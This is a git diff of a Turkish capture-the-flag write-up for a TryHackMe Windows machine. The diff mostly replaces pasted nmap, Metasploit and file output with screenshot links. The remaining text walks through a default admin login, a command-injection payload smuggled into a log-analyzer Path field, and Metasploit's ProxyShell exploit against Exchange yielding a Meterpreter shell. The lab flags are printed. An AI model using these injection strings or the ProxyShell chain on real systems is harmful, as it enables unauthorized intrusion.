@@ -17,21 +17,7 @@ Makine ICMP'ye cevap vermiyor, o yüzden nmap taramalarında `-Pn` kullanmayı u
 ```
 nmap -sS -A -p- -Pn 10.112.141.99
 ```
-
-Çıktıda dikkatimi çeken portlar şunlardı:
-
-```
-PORT     STATE SERVICE       VERSION
-80/tcp   open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn't have a title.
-443/tcp  open  ssl/https
-|_http-server-header: Microsoft-IIS/10.0
-| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
-| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
-```
+<img width="1018" height="604" alt="nmap" src="https://github.com/user-attachments/assets/cd822af1-eed6-48b7-a862-97685f9017c4" />
 
 SSL sertifikasının Subject Alternative Name kısmında `WIN-12OUO7A66M7.thm.local` diye bir domain adı geçiyordu. Bunu doğrudan `/etc/hosts` dosyama ekledim, çünkü IIS gibi sunucular çoğu zaman hostname'e göre farklı içerik döndürebiliyor (virtual host routing):
 
@@ -44,6 +30,7 @@ echo "10.112.141.99 WIN-12OUO7A66M7.thm.local" >> /etc/hosts
 ```
 https://10.112.141.99/owa/auth/logon.aspx?url=https%3a%2f%2f10.112.141.99%2fowa%2f&reason=0
 ```
+<img width="1212" height="606" alt="loginsayfa" src="https://github.com/user-attachments/assets/f42ffaa3-40a3-46a7-a6c4-c3c0f6ccbcc1" />
 
 Bu da bana ortamda **Microsoft Exchange** olduğunu gösterdi — nmap çıktısındaki sertifika bilgileriyle de örtüşüyordu.
 
@@ -61,6 +48,9 @@ Boş dönünce nikto ve whatweb ile devam ettim.
 nikto -h 10.112.141.99
 whatweb 10.112.141.99
 ```
+<img width="1057" height="312" alt="nikto" src="https://github.com/user-attachments/assets/da4adf75-16d1-4a8e-9d90-9276ed08f7b3" />
+
+<img width="1093" height="195" alt="whatweb" src="https://github.com/user-attachments/assets/76da05f4-5a09-4275-913b-1889a8f414c7" />
 
 Nikto çıktısında işime yarayan iki şey vardı:
 
@@ -83,7 +73,11 @@ https://10.112.141.99/owa/auth/logon.aspx?... [200 OK] ... Outlook-Web-App ...
 
 ## Gizli bir arayüz buluyorum
 
-OWA tarafında bir şey bulamayınca, hostname üzerinde biraz gezinmeye karar verdim. `https://win-12ouo7a66m7.thm.local/` adresine `/test` yolunu ekleyip denedim ve karşıma beklenmedik bir panel çıktı:
+OWA tarafında bir şey bulamayınca, hostname üzerinde biraz gezinmeye karar verdim. `https://win-12ouo7a66m7.thm.local/` adresine `/test` yolunu ekleyip denedim (admin::admin) ve karşıma beklenmedik bir panel çıktı:
+
+<img width="498" height="297" alt="adminadmin" src="https://github.com/user-attachments/assets/b375d031-70ac-4947-a698-940b9ab3f8a5" />
+
+<img width="696" height="328" alt="test" src="https://github.com/user-attachments/assets/65321ff5-8b55-4a48-b16e-c4efd879a8b6" />
 
 ```
 This interface should be removed on production!
@@ -118,6 +112,9 @@ Buradan sonra hedefim Desktop altındaki `user.txt` dosyasıydı:
 ```
 BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\user.txt #
 ```
+<img width="938" height="387" alt="desktopiçi" src="https://github.com/user-attachments/assets/542408aa-fffe-410b-9b76-7509204bd48b" />
+
+<img width="960" height="282" alt="usertxt" src="https://github.com/user-attachments/assets/eed02d73-20ef-4eeb-9f41-0998d4dea01b" />
 
 ```
 THM{Stop_Reading_Start_Doing}
@@ -128,31 +125,9 @@ THM{Stop_Reading_Start_Doing}
 Desktop'ı `dir` ile listelediğimde bir `TODO.txt` dosyası daha gördüm, onu da okudum:
 
 ```
-BitlockerActiveMonitoringLogs'); dir c:\users\dev\desktop\ #
 BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\TODO.txt #
 ```
-
-İçeriği şöyleydi:
-
-```
-Hey dev team,
-
-This is the tasks list for the deadline:
-
-Promote Server to Domain Controller [DONE]
-Setup Microsoft Exchange [DONE]
-Setup IIS [DONE]
-Remove the log analyzer [TO BE DONE]
-Add all the users from the infra department [TO BE DONE]
-Install the Security Update for MS Exchange [TO BE DONE]
-Setup LAPS [TO BE DONE]
-
-When you are done with the tasks please send an email to:
-joe@thm.local
-carol@thm.local
-and do not forget to put in CC the infra team!
-dev-infrastracture-team@thm.local
-```
+<img width="937" height="524" alt="TODOtxt" src="https://github.com/user-attachments/assets/05f73f2b-2525-415d-9884-cb8058607366" />
 
 Bu not aslında yol haritamı çizdi. İki şey öne çıkıyordu:
 
@@ -180,6 +155,7 @@ msf > search proxyshell
 ```
 0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06  excellent  Yes  Microsoft Exchange ProxyShell RCE
 ```
+<img width="977" height="308" alt="use0" src="https://github.com/user-attachments/assets/14e77527-0786-4b36-b55d-4434a0cddd4f" />
 
 Modülü seçip gerekli ayarları yaptım:
 
@@ -214,18 +190,9 @@ set EMAIL dev-infrastracture-team@thm.local
 
 Tekrar `check` ve `run`:
 
-```
-[+] The target is vulnerable.
-[*] Attempt to exploit for CVE-2021-34473
-[*] Retrieving backend FQDN over RPC request
-[*] Internal server name: win-12ouo7a66m7.thm.local
-[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
-[+] Successfully assigned the 'Mailbox Import Export' role
-[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\kt52oHEt.aspx
-[*] Triggering the payload
-[*] Sending stage (203846 bytes) to 10.112.141.99
-[*] Meterpreter session 1 opened (attacker_ip:4444 -> 10.112.141.99:10071)
-```
+<img width="1131" height="746" alt="set1" src="https://github.com/user-attachments/assets/4c68b15f-f458-4231-bd1f-ede3504219eb" />
+
+<img width="1058" height="264" alt="set2" src="https://github.com/user-attachments/assets/656dd24a-b6ff-4f86-9d33-61d805e279ac" />
 
 Bu sefer çalıştı ve bir **Meterpreter oturumu** açtım. Exploit arka planda kendi webshell'ini ve mail export request'ini de temizledi.
 
@@ -256,24 +223,4 @@ meterpreter > ls
 meterpreter > cat flag.txt
 THM{Looking_Back_Is_Not_Always_Bad}
 ```
-
-Ve son flag de böylece elime geçti — makine adına da (**Lookback**) güzel bir gönderme oluyor.
-
----
-
-## Özet ve Çıkarımlar
-
-Bu makinede takip ettiğim zincir kısaca şöyleydi:
-
-1. Nmap ile portları ve Exchange/IIS izlerini keşfettim, SSL sertifikasındaki hostname'i `/etc/hosts`'a ekleyerek gizli sanal host'a erişim sağladım.
-2. `/test` yolunda unutulmuş bir "Log Analyzer" arayüzü buldum — production'da olmaması gereken bir debug/test paneliydi.
-3. Panelin `Path` parametresinde sanitize edilmemiş bir command injection açığı vardı, bunu `'); <komut> #` payload'ıyla istismar ederek dosya sistemine erişim sağladım.
-4. Bulduğum bir TODO notundan, Exchange'in yamalanmadığı ve kullanılabilecek bir e-posta adresi bilgisini edindim.
-5. Bu bilgiyi kullanarak Metasploit'in ProxyShell (CVE-2021-34473) modülüyle sistem üzerinde tam yetkili bir Meterpreter shell aldım.
-
-Bu makine aslında gerçek dünyada da sıkça karşılaşılan bir senaryoyu güzel özetliyor: aceleye getirilmiş deployment'lar, production'da unutulmuş debug arayüzleri ve yamalanmamış Exchange sunucuları — üçü bir araya geldiğinde domain'in tamamen ele geçirilmesine kadar gidebiliyor.
-
-**Alınan flag'ler:**
-- `THM{Security_Through_Obscurity_Is_Not_A_Defense}`
-- `THM{Stop_Reading_Start_Doing}`
-- `THM{Looking_Back_Is_Not_Always_Bad}`
+<img width="873" height="540" alt="set3shell" src="https://github.com/user-attachments/assets/e731eac3-a05d-4cdd-aa89-574197f19b45" />
